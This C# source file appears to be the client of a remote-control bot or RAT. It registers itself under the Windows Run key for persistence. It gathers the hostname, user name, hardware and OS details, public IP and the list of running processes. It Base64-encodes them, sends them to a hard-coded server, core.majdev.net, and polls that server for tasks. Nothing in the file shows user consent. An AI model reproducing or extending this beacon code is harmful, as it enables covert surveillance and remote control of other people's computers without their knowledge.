using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Windows.Forms;

namespace Core
{
    static public class CoreLibrary
    {
        public static string Key = "0X8BADSJGF23!!^?=)";
        public static string Path = "https://core.majdev.net/";
        static public bool CheckID(){
            string id = Core_Regedit.Read("ID");
            if(id == null){
                return false;
            }
            else
            {
                if(id.Length == 3){
                    return true;
                }
                else{
                    return false;
                }
            }
        }

        static public bool CheckLan(){
            return NetworkInterface.GetIsNetworkAvailable();
        }

        static public bool CheckServer()
        {
            try{
                if (CheckLan() == true){
                    WebClient Client = new WebClient();
                    string value = Client.DownloadString(Path + "core_checkserver.php");
                    if (value == "OK")
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                else {
                    return false;
                }
            }
            catch{
                return false;
            }
        }

        static public string CreateDevice(string password){
            WebClient Client = new WebClient();
            string id = Client.DownloadString(Path + "core_createdevice.php?key=" + Key + "&password=" + password);
            Core_Regedit.Create("ID", id);
            return id;
        }

        static public void SendStatus(string id){
            WebClient Client = new WebClient();
            Client.DownloadString(Path + "core_sendstatus.php?key=" + Key + "&id=" + id);
        }

        static public void SendData(string id, string data){
            WebClient Client = new WebClient();
            Client.DownloadString(Path + "core_senddata.php?key=" + Key + "&id=" + id + "&data=" + data);
        }

        static public string SendTaskReset(string id){
            WebClient Client = new WebClient();
            return Client.DownloadString(Path + "core_sendtaskreset.php?key=" + Key + "&id=" + id);
        }

        static public string ChechTask(string id){
            WebClient Client = new WebClient();
            return Client.DownloadString(Path + "core_checktask.php?key=" + Key + "&id=" + id);
        }

        static public string CreateData(){
            if(Struct.Computer_Data == null){       
            string st1 = Dns.GetHostName() + "*|*" + Environment.UserName;
            string st2 = Core_Computer.CPUName() + "*|*" + Core_Computer.GPUName() + "*|*" + Core_Computer.RAMSize() + "*|*" + Core_Computer.OSInfo();
            string st3 = Core_Computer.IP();
                Struct.Computer_Data = st1 + "!=!" + st2 + "!=!" + st3;
            }
            Struct.Apps = "";
            string newString = "";
            Process[] Processes = Process.GetProcesses();
            foreach (Process p in Processes){
                if(newString.LastIndexOf(p.ProcessName + ".exe?%%?") > 0){
                    continue;
                }
                else{
                    newString = newString + p.ProcessName + ".exe?%%?";
                }
            }
            Struct.Apps = newString;
            Struct.Data = Struct.Computer_Data + "^*^" + Struct.Apps;
            return EncryptionLibrary.Base64Encode(Struct.Data);
        }
    }

    static public class Core_Regedit
    {
        public static string App = "Core";
        public static void Create(string name, string data){
            Registry.CurrentUser.CreateSubKey(App);
            RegistryKey regedit = Registry.CurrentUser.OpenSubKey(App, true);
            regedit.SetValue(name, data);
        }
        public static string Read(string name)
        {
            RegistryKey regedit = Registry.CurrentUser.OpenSubKey(App, true);
            if (regedit != null){
                object data = regedit.GetValue(name);
                if (data != null)
                {
                    return data.ToString();
                }
                else{
                    return null;
                }
            }
            else{
                return null;
            }
        }
        public static void AddStatup(){
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue(App, "\"" + Application.ExecutablePath + "\"");
        }
    }

    static public class Core_Computer
    {
        public static string CPUName(){
            try{
                string name = null;
                ManagementObjectSearcher mosProcessor = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
                foreach (ManagementObject moProcessor in mosProcessor.Get()){
                    name = moProcessor["name"].ToString();
                }
                return name;
            }
            catch{
                return "#ERROR";
            }
        }
        public static string GPUName(){
            try {
                string name = null;
                ManagementObjectSearcher vidSearcher = new ManagementObjectSearcher("Select * from Win32_VideoController Where availability='3'");
                foreach (ManagementObject mObject in vidSearcher.Get()){
                    name = mObject["name"].ToString();
                }
                return name;
            }
            catch{
                return "#ERROR";
            }
        }

        public static string RAMSize(){
            try{
                string size = null;
                ManagementObjectSearcher ramSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
                foreach (ManagementObject mObject in ramSearcher.Get()){
                    double Ram_Bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
                    double ramgb = Ram_Bytes / 1073741824;
                    double ramSize = Math.Ceiling(ramgb);
                    size = ramSize.ToString() + " GB";
                }
                return size;
            }
            catch{
                return "#ERROR";
            }  
        }

        public static string OSInfo(){
            try {
                string osSerial = null;
                string osVersionInfo = null;
                string OSinfo = null;
                ManagementObjectSearcher osInfo = new ManagementObjectSearcher("Select * From Win32_OperatingSystem");
                foreach (ManagementObject osInfoObj in osInfo.Get())
                {
                    osSerial = (string)osInfoObj["Caption"];
                    osVersionInfo = (string)osInfoObj["Version"];
                    OSinfo = osSerial + " - " + osVersionInfo;
                }
                return OSinfo;
            }
            catch{
                return "#ERROR";
            } 
        }

        public static string IP(){
            try{
                WebClient Client = new WebClient();
                return Client.DownloadString("http://checkip.dyndns.org/").Replace("<html><head><title>Current IP Check</title></head><body>Current IP Address: ", "").Replace("</body></html>", "").Replace("\n", "");
            }
            catch {
                return "#ERROR";
            }
        }
    }
}
